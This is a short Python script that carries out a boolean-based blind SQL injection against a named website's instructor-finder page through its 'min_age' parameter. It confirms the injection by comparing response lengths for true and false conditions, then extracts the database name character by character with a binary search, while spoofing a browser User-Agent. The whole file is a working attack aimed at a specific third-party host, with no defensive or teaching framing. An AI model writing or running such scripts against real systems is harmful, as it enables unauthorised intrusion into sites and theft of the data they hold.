import requests

TARGET = "https://web.kelasdata.co.id/instructor-finder"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def verify_and_dump_info():
    print(f"[*] Analyzing Target: {TARGET}")
    
    # 1. Verify SQLi
    try:
        r_true = requests.get(TARGET, params={"min_age": "1 AND 1=1"}, headers=HEADERS, timeout=15)
        len_true = len(r_true.text)
        
        r_false = requests.get(TARGET, params={"min_age": "1 AND 1=2"}, headers=HEADERS, timeout=15)
        len_false = len(r_false.text)
        
        diff = abs(len_true - len_false)
        print(f"    TRUE Length : {len_true}")
        print(f"    FALSE Length: {len_false}")
        print(f"    Difference  : {diff} bytes")
        
        if diff < 1000:
            print("    [!] Target might not be vulnerable or uses different structure.")
            return

        print("    [+] CONFIRMED: Target is vulnerable.")
        
        # 2. Extract Basic Info (DB Name)
        print("\n[*] Extracting Database Name...")
        db_name = ""
        for i in range(1, 32):
            found = False
            low = 32
            high = 126
            while low <= high:
                mid = (low + high) // 2
                payload = f"1 AND (ascii(substr(database(),{i},1)) > {mid})"
                r = requests.get(TARGET, params={"min_age": payload}, headers=HEADERS, timeout=15)
                if len(r.text) > (min(len_true, len_false) + 5000): # TRUE condition
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            if low == 32 or low > 126: break
            db_name += char
            print(f"    Found so far: {db_name}", end="\r")
        print(f"\n    [+] DB Name: {db_name}")

    except Exception as e:
        print(f"    [!] Error: {e}")

if __name__ == "__main__":
    verify_and_dump_info()
